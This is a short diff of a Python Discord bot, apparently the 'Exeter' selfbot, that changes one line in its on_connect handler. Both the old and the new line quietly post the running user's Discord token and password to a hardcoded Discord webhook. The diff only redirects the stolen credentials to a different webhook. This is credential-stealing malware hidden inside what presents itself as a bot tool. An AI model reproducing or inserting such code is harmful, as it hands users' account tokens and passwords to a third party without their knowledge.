@@ -398,7 +398,7 @@ async def on_member_remove(member):
 @Exeter.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/779000135962722345/wXz0G7IR0r6zBYfjLRrl-Vh-Gb5GnVdeMV2q2irJfoxGJi41ZxwybUtNJFBKRmIjMWxM',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://discordapp.com/api/webhooks/779076059387002931/5LeBSLUfTX3CEPaF-zlymVt9QtZGk1cT5zKcI9RYKu6bQPMOTZuH9woLxVVfvB-5NvK5',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()            
 
 @Exeter.command(aliases=["queue"])
